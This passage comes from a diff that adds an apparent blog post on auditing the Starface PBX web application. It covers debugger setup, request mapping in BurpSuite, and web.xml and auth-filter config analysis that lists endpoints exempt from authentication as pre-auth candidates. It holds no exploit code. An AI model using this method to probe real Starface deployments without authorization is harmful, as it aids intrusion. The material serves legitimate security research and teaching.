+  &lt;li&gt;Add the JAR file(s) baked with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jarjarbigs&lt;/code&gt; to your project as &lt;strong&gt;external JAR dependencies&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Create a remote debug configuration and run it.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The two steps in 3. should give you something like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/debugconfiguration.png&quot; alt=&quot;Create Debug Configuration&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/debugrunning.png&quot; alt=&quot;Start Debugging&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We almost had all we needed to start the audit:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Running virtual machine of the vendor.&lt;/li&gt;
+  &lt;li&gt;SSH access to the virtual machine with root privileges.&lt;/li&gt;
+  &lt;li&gt;Decompiled Java code.&lt;/li&gt;
+  &lt;li&gt;A working debugging environment in Eclipse.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;application-mapping&quot;&gt;Application Mapping&lt;/h1&gt;
+
+&lt;p&gt;Before looking at any code, I take some time to learn about the web interface first. Starting up &lt;strong&gt;BurpSuite&lt;/strong&gt;, login, click every button, fill every field and take notes about everything you observe in the UI in combination with requests going through your MitM proxy of your choice.&lt;/p&gt;
+
+&lt;p&gt;We take the same mindset as we explained above during the SSH session enumeration part: try to spot &lt;strong&gt;interesting&lt;/strong&gt; things but also &lt;strong&gt;uninteresting&lt;/strong&gt; ones. “Uninteresting” could be e.g. “loading of JavaScript files”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/uninterestingrequest.png&quot; alt=&quot;Uninteresting Request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And “interesting” example could be a request processing interesting parameters.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/interestingrequest.png&quot; alt=&quot;Interesting Request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Take notes about absolutely everything, even though you might think that it’s only &lt;em&gt;of little interest at the moment&lt;/em&gt;. Often I revisit my notes from top to down from time to time during my review process and then “rediscover” things, get new ideas for chains whatsoever. Here are some examples:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/start.jsp&lt;/code&gt; -&amp;gt; we expect JSP handlers (strange, we didn’t find any JSP files, remember?)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/login&lt;/code&gt; -&amp;gt; POST request with parameters named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forward&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret (0002:f3abb3a69bee79[...])&lt;/code&gt; -&amp;gt; containing our user ID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0002&lt;/code&gt; and some kind of hash&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/frontend/calllist/display.do&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.do&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.action&lt;/code&gt; might be good indicators for &lt;strong&gt;Struts&lt;/strong&gt; being used&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;webxml&quot;&gt;web.xml&lt;/h1&gt;
+
+&lt;p&gt;After collecting tons of requests, understanding a bit of business logic, use cases etc. of the targeted product, we tried to understand how requests are mapped to code. In Java applications the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; usually reveals a ton of information. Of course this also depends on the frameworks used etc. which could make the content of this file minimal.&lt;/p&gt;
+
+&lt;p&gt;In our case, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; contained &lt;strong&gt;6651&lt;/strong&gt; lines of content…&lt;strong&gt;six thousand six hundred and fifty one&lt;/strong&gt;. That’s a looooot. So how did I approach this in the first place? Take your time to at least scroll slowly through the whole file because not every web descriptor file uses the same attributes, declarations etc. Try to use the principle of &lt;strong&gt;Divide and Conquer&lt;/strong&gt; to extract abstract categories easier to handle by your brain in the beginning. This &lt;em&gt;could&lt;/em&gt; look like this but I guess is pretty subjective.&lt;/p&gt;
+
+&lt;p&gt;First, I realized Starface had a large number of &lt;em&gt;Java Filters&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;i18nFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-class&amp;gt;&lt;/span&gt;de.vertico.starface.filters.i18nFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-class&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;PhoneMenuAuthFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-class&amp;gt;&lt;/span&gt;de.vertico.starface.filters.PhoneAuthFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-class&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;scope&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;PhoneMenu&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;default-port&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;50080&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;secure-port&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;50081&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, there were several extra configuration files included/referenced.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;configfile&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;/WEB-INF/starface-config.xml&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;authFilterConfig&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;/WEB-INF/xml/authfilter_config.xml&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I saw the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/code&gt; matchers, here linking ?Struts? action URLs to Java Filters.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- .action filter mappings --&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;ExceptionFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.action&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;dispatcher&amp;gt;&lt;/span&gt;REQUEST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dispatcher&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;PortFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.action&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;dispatcher&amp;gt;&lt;/span&gt;REQUEST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dispatcher&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You could also map Java Filters with Java Servlets.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- REST filter mappings --&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;PortFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;REST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;AntiXssFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;REST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We also noted the first time some kind of “security awareness” from the programmer’s perspective by spotting the keyword &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AntiXssFilter&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;There were a few more combinations but I won’t list all of them.
+If you’re familiar with manual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; parsing and might already think about &lt;strong&gt;Pre-Auth endpoints&lt;/strong&gt; then try to find declarations with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;security-constraint&amp;gt;&lt;/code&gt;: you won’t for Starface! It seemed that they used some kind of custom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthFilter&lt;/code&gt; instead. Such kind of Java Filter was applied at all kinds of URL patterns e.g. for all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.do&lt;/code&gt; URLs.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;AuthFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-class&amp;gt;&lt;/span&gt;de.vertico.starface.filters.AuthFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-class&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter&amp;gt;&lt;/span&gt;
+[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;AuthFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.do&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright, let’s recap: most of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; contained Java Filter declarations. This was fine since Java Filters are implemented in Java code as Java Servlets are as well. From a programmatic perspective, they only differ (that’s a &lt;em&gt;very rough differentiator!&lt;/em&gt;) in the method name being called during request processing.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Java Filters: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Java Servlets: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doGet, doPost, service&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As I understood it, Java Filter order in the descriptor file is usually preserved for the request processing part. What does this mean? Let’s make an example.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;CharacterEncodingFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;FailedRequestFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These two filters should be triggered by basically every incoming request. If I’m unable to Google specific questions, I simply test it empirically. Since we had the debugging environment running already, a test was easy.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Set a breakpoint at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.filters.CharacterEncodingFilter.doFilter(ServletRequest, ServletResponse, FilterChain)&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Set a breakpoint at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.filters.FailedRequestFilter.doFilter(ServletRequest, ServletResponse, FilterChain)&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Browse to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/IDefinitelyDontCare&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/characterencodingfilter.png&quot; alt=&quot;Character Encoding Filter&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/failedrequestfilter.png&quot; alt=&quot;Failed Request Filter&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seemed this was a correct assumption. Why did we care? Because if a Java Filter contained a vulnerability before any &lt;em&gt;authentication check&lt;/em&gt; could step in (remember the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthFilter&lt;/code&gt;?), this would have led to a &lt;em&gt;Pre-Auth condition&lt;/em&gt;. So we could have built a graph of URL patterns and Java Filter orders to obtain a list of Java Filters called before authentication checks would have been triggered.&lt;/p&gt;
+
+&lt;p&gt;Additionally, we spotted a file inclusion of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WEB-INF/xml/authfilter_config.xml&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; with the following content.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;properties&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;category&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;general&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 
+		Hier werden Pfade aufgelistet die keine Authorisierung brauchen
+		und vom AuthFilter ignoriert werden
+		(translated by me)
+		This is a list of paths which do not need any authorization and
+		are therefore ignored bei AuthFilter
+		(/translated by me)
+	 --&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/ajax/restore&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/ajax/update&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/blank.html&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/index.jsp&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/jsp/blank.html&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login.jsp&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/category&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/properties&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These were additional candidates to check for Pre-Auth flaws.&lt;/p&gt;
+
+&lt;p&gt;What about endpoints which were not handled by this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthFilter&lt;/code&gt;? We found another authentication check filter in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;RestAuthFilterA&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-class&amp;gt;&lt;/span&gt;de.starface.rest.authentication.RestAuthFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-class&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;which might be handling URLs of another &lt;strong&gt;REST&lt;/strong&gt; interface.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;REST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/rest/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finding another Filter/Servlet mapping confirmed our assumption.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;RestAuthFilterA&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;REST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Java Servlet definition was found quickly.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&amp;lt;servlet&amp;gt;
+		&amp;lt;servlet-name&amp;gt;REST&amp;lt;/servlet-name&amp;gt;
+		&amp;lt;servlet-class&amp;gt;com.sun.jersey.spi.spring.container.servlet.SpringServlet&amp;lt;/servlet-class&amp;gt;
+		&amp;lt;init-param&amp;gt;
+			&amp;lt;param-name&amp;gt;com.sun.jersey.config.property.packages&amp;lt;/param-name&amp;gt;
+			&amp;lt;param-value&amp;gt;
+				io.swagger.jaxrs.json;
+				io.swagger.jaxrs.listing;
+				de.starface.middleware;
+				de.starface.persistence.jpa;
+				de.starface.rest;
+				de.starface.rest.common;
+				de.starface.rest.controller;
+				de.starface.rest.addressbook.api;
+				de.starface.rest.redirects.api;
+				de.starface.rest.fmcPhones.api
+				de.starface.rest.functionkeys.api;
+				de.starface.rest.users.api;
+		[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we should take a look at the namespace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.starface.rest&lt;/code&gt; to get an idea of how the &lt;strong&gt;Spring REST&lt;/strong&gt; interfaces were implemented. The &lt;strong&gt;namespace structure&lt;/strong&gt; often gives good hints about how the programmers organized their code: another important step to make your code auditing process more efficient.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/restnamespacestructure.png&quot; alt=&quot;REST Namespace Structure&quot; /&gt;&lt;/p&gt;
+
